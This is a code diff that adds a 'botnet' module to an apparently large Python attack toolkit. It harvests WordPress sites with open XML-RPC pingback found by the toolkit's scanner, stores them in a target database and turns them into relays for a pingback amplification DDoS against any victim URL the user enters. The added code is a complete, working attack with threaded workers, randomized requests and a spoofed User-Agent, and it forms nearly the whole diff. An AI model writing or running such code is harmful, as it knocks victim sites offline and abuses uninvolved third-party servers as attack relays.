@@ -20,6 +20,7 @@ import random
 import string
 import subprocess
 import shutil
+from datetime import datetime
 from urllib.parse import urlparse, urljoin
 
 try:
@@ -106,6 +107,8 @@ BANNER = rf"""
 """
 
 SEPARATOR = f"{C}{'─' * 60}{RST}"
+
+BOTNET_DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "botnet_targets.json")
 
 # ─── Stealth Mode ─────────────────────────────────────────────────────────────
 
@@ -832,6 +835,43 @@ def prompt(label="Target"):
 
 def pause():
     input(f"\n  {C}Press Enter to continue...{RST}")
+
+
+# ─── Botnet Target DB ────────────────────────────────────────────────────────
+
+def _botnet_db_load():
+    if os.path.exists(BOTNET_DB):
+        try:
+            with open(BOTNET_DB, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except (json.JSONDecodeError, IOError):
+            return []
+    return []
+
+
+def _botnet_db_save(targets):
+    with open(BOTNET_DB, "w", encoding="utf-8") as f:
+        json.dump(targets, f, indent=2, ensure_ascii=False)
+
+
+def _botnet_db_add(url, cms, vectors):
+    targets = _botnet_db_load()
+    for t in targets:
+        if t["url"] == url:
+            t["vectors"] = list(set(t.get("vectors", []) + vectors))
+            t["last_seen"] = datetime.now().isoformat()
+            t["cms"] = cms
+            _botnet_db_save(targets)
+            return
+    targets.append({
+        "url": url,
+        "cms": cms,
+        "vectors": vectors,
+        "xmlrpc_url": url.rstrip("/") + "/xmlrpc.php",
+        "added": datetime.now().isoformat(),
+        "last_seen": datetime.now().isoformat(),
+    })
+    _botnet_db_save(targets)
 
 
 # ─── 1. Username Search ───────────────────────────────────────────────────────
@@ -4496,6 +4536,16 @@ def cms_vuln_scanner():
                 if high:
                     print(f"    {R}[!] HIGH risk methods:{RST} {', '.join(high)}")
 
+                # ── Save to botnet DB if DDoS vectors found ──
+                ddos_vecs = []
+                if "system.multicall" in xmlrpc_methods:
+                    ddos_vecs.append("system.multicall")
+                if "pingback.ping" in xmlrpc_methods:
+                    ddos_vecs.append("pingback.ping")
+                if ddos_vecs:
+                    _botnet_db_add(url, cms, ddos_vecs)
+                    print(f"    {G}[+]{RST} Target saved to botnet DB → {os.path.basename(BOTNET_DB)}")
+
                 # ── Offer brute-force attack ──
                 print(f"\n    {Y}XML-RPC brute-force vector confirmed.{RST}")
                 run_bf = input(f"    {Y}Launch XML-RPC brute-force attack? (y/N):{RST} ").strip().lower()
@@ -7648,6 +7698,209 @@ def websocket_flood():
     print_row("Data Sent", f"{counter[0] * msg_size / 1024 / 1024:.1f} MB")
 
 
+# ─── Botnet — Coordinated DDoS from Discovered Targets ──────────────────────
+
+def botnet_manager():
+    print_header("Botnet — Coordinated Attack from Discovered Targets")
+    if not stress_disclaimer():
+        return
+
+    targets = _botnet_db_load()
+
+    while True:
+        print(f"\n  {Y}── Botnet Target Manager ──{RST}")
+        print(f"  {C}Targets in DB:{RST} {W}{len(targets)}{RST}\n")
+
+        if targets:
+            for i, t in enumerate(targets, 1):
+                vecs = ", ".join(t.get("vectors", []))
+                added = t.get("added", "?")[:10]
+                print(f"  {C}{i:>3}.{RST} {W}{t['url']}{RST}  [{t.get('cms', '?')}]  "
+                      f"vectors: {R}{vecs}{RST}  added: {added}")
+            print()
+
+        ping_targets = [t for t in targets if "pingback.ping" in t.get("vectors", [])]
+
+        print(f"  {Y}Options:{RST}")
+        print(f"    {R}1.{RST} XML-RPC Pingback Amplification ({G}{len(ping_targets)}{RST} relays available)")
+        print(f"    {C}2.{RST} Add target manually")
+        print(f"    {C}3.{RST} Remove target")
+        print(f"    {C}4.{RST} Clear all targets")
+        print(f"    {C}0.{RST} Back to main menu")
+
+        choice = input(f"\n  {Y}Select >{RST} ").strip()
+
+        if choice == "0":
+            return
+        elif choice == "1":
+            if not ping_targets:
+                print_err("No targets with pingback.ping vector. Run CMS Vuln Scanner (50) first.")
+                continue
+            _botnet_xmlrpc_amplify(ping_targets)
+        elif choice == "2":
+            new_url = prompt("Target URL")
+            if not new_url:
+                continue
+            if not new_url.startswith(("http://", "https://")):
+                new_url = "https://" + new_url
+            new_url = new_url.rstrip("/")
+            _botnet_db_add(new_url, "Manual", ["pingback.ping"])
+            targets = _botnet_db_load()
+            print(f"  {G}[+]{RST} Target added.")
+        elif choice == "3":
+            idx = input(f"  {Y}Target number to remove:{RST} ").strip()
+            try:
+                idx = int(idx) - 1
+                if 0 <= idx < len(targets):
+                    removed = targets.pop(idx)
+                    _botnet_db_save(targets)
+                    print(f"  {G}[+]{RST} Removed: {removed['url']}")
+                else:
+                    print_err("Invalid number.")
+            except ValueError:
+                print_err("Enter a valid number.")
+        elif choice == "4":
+            confirm = input(f"  {R}Clear ALL targets? (yes/no):{RST} ").strip().lower()
+            if confirm in ("yes", "y"):
+                targets = []
+                _botnet_db_save(targets)
+                print(f"  {G}[+]{RST} All targets cleared.")
+        else:
+            print_err("Invalid option.")
+
+
+def _botnet_xmlrpc_amplify(relays):
+    """Use WordPress sites with pingback.ping as amplifiers against a victim URL."""
+    print(f"\n  {R}{'═' * 60}{RST}")
+    print(f"  {R}  XML-RPC PINGBACK AMPLIFICATION{RST}")
+    print(f"  {R}{'═' * 60}{RST}")
+    print(f"  {W}Each WordPress relay will send HTTP requests to the victim{RST}")
+    print(f"  {W}URL via pingback.ping — the WP sites act as amplifiers.{RST}")
+    print(f"  {C}Available relays:{RST} {G}{len(relays)}{RST}")
+    for r in relays:
+        print(f"    {R}►{RST} {r['url']}")
+    print(f"  {R}{'═' * 60}{RST}")
+
+    victim = prompt("Victim URL (the target to DDoS)")
+    if not victim:
+        return
+    if not victim.startswith(("http://", "https://")):
+        victim = "https://" + victim
+
+    threads_per = input(f"  {Y}Threads per relay (1-50) [10]:{RST} ").strip() or "10"
+    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"
+
+    try:
+        threads_per = min(50, max(1, int(threads_per)))
+        duration = min(300, max(1, int(duration)))
+    except ValueError:
+        print_err("Invalid numbers")
+        return
+
+    print(f"\n  {R}  VICTIM:  {W}{victim}{RST}")
+    print(f"  {R}  RELAYS:  {W}{len(relays)}{RST}")
+    print(f"  {R}  THREADS: {W}{threads_per}/relay = {threads_per * len(relays)} total{RST}")
+    print(f"  {R}  DURATION:{W} {duration}s{RST}")
+
+    confirm = input(f"\n  {R}Confirm launch? (yes/no):{RST} ").strip().lower()
+    if confirm not in ("yes", "y", "si", "s"):
+        print_warn("Aborted.")
+        return
+
+    stop_event = threading.Event()
+    counters = {r["url"]: [0] for r in relays}
+    errors = [0]
+    start_time = time.time()
+
+    def pingback_worker(relay_url, counter):
+        xmlrpc_url = relay_url.rstrip("/") + "/xmlrpc.php"
+        sess = requests.Session()
+        while not stop_event.is_set():
+            try:
+                # Randomize the post ID to generate unique pingback requests
+                post_id = random.randint(1, 9999)
+                payload = (
+                    '<?xml version="1.0"?>'
+                    '<methodCall><methodName>pingback.ping</methodName><params>'
+                    f'<param><value><string>{victim}</string></value></param>'
+                    f'<param><value><string>{relay_url}/?p={post_id}</string></value></param>'
+                    '</params></methodCall>'
+                )
+                sess.post(
+                    xmlrpc_url,
+                    data=payload,
+                    headers={
+                        "Content-Type": "text/xml",
+                        "User-Agent": f"WordPress/{random.randint(5,6)}.{random.randint(0,9)}",
+                    },
+                    timeout=8,
+                    verify=False,
+                )
+                counter[0] += 1
+            except Exception:
+                errors[0] += 1
+            # Small jitter to avoid burst patterns
+            time.sleep(random.uniform(0.05, 0.3))
+
+    def stats_printer():
+        while not stop_event.is_set():
+            elapsed = time.time() - start_time
+            if elapsed > 0:
+                parts = []
+                total = 0
+                for u, cnt in counters.items():
+                    domain = urlparse(u).netloc
+                    parts.append(f"{domain}:{cnt[0]}")
+                    total += cnt[0]
+                rps = total / elapsed
+                sys.stdout.write(
+                    f"\r  {Y}[AMPLIFY]{RST} Pingbacks: {G}{total}{RST}  "
+                    f"Rate: {C}{rps:.0f}/s{RST}  "
+                    f"Errors: {R}{errors[0]}{RST}  "
+                    f"Relays: {' | '.join(parts)}    "
+                )
+                sys.stdout.flush()
+            time.sleep(1)
+
+    st = threading.Thread(target=stats_printer)
+    st.daemon = True
+    st.start()
+
+    workers = []
+    for r in relays:
+        for _ in range(threads_per):
+            w = threading.Thread(target=pingback_worker, args=(r["url"], counters[r["url"]]))
+            w.daemon = True
+            w.start()
+            workers.append(w)
+
+    try:
+        time.sleep(duration)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop_event.set()
+        time.sleep(1)
+
+    elapsed = time.time() - start_time
+    total_pings = sum(c[0] for c in counters.values())
+    print(f"\n\n  {Y}{'═' * 60}{RST}")
+    print(f"  {Y}  AMPLIFICATION RESULTS{RST}")
+    print(f"  {Y}{'═' * 60}{RST}")
+    print_row("Victim", victim)
+    for r in relays:
+        cnt = counters[r["url"]][0]
+        domain = urlparse(r["url"]).netloc
+        print(f"  {C}{domain:<35}{RST} {W}{cnt} pingbacks sent{RST}")
+    print(f"  {Y}{'─' * 60}{RST}")
+    print_row("Total Pingbacks", str(total_pings))
+    print_row("Errors", str(errors[0]))
+    print_row("Duration", f"{elapsed:.1f}s")
+    print_row("Avg Rate", f"{total_pings / elapsed:.0f} pingbacks/s" if elapsed > 0 else "N/A")
+    print(f"\n  {W}Each pingback triggers the relay WP site to fetch the victim URL.{RST}")
+    print(f"  {W}Effective amplification: {G}~{total_pings}x{RST} {W}HTTP requests to victim.{RST}")
+
+
 # ═══════════════════════════════════════════════════════════════════════════════
 #                          PHISHING MODULES
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -9107,8 +9360,11 @@ def show_menu():
              len(RECON_ITEMS) + len(EXPLOIT_ITEMS) + len(STRESS_ITEMS) + 1, M)
     print(f"  {Y}╠{'═' * w}╣{RST}")
     ai_txt = "AI Search — Find the best tool for your needs"
+    bot_count = len(_botnet_db_load())
+    bot_txt = f"Botnet — Coordinated DDoS ({bot_count} target{'s' if bot_count != 1 else ''})"
     print(f"  {Y}║{RST}  {G} A.{RST} {W}{ai_txt:<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {M} S.{RST} {W}{'Stealth Mode Config':<{w - 6}}{Y}║{RST}")
+    print(f"  {Y}║{RST}  {R} B.{RST} {W}{bot_txt:<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {R} 0.{RST} {W}{'Exit':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}╚{'═' * w}╝{RST}")
 
@@ -9137,6 +9393,14 @@ def main():
             configure_stealth()
             continue
 
+        if choice.lower() == "b":
+            try:
+                botnet_manager()
+            except KeyboardInterrupt:
+                print(f"\n  {Y}Interrupted.{RST}")
+            pause()
+            continue
+
         try:
             idx = int(choice) - 1
             if 0 <= idx < len(MENU_ITEMS):
@@ -9149,7 +9413,7 @@ def main():
             else:
                 print_err("Invalid option")
         except ValueError:
-            print_err("Enter a number or 'S' for Stealth config")
+            print_err("Enter a number, 'S' for Stealth, or 'B' for Botnet")
 
 
 if __name__ == "__main__":
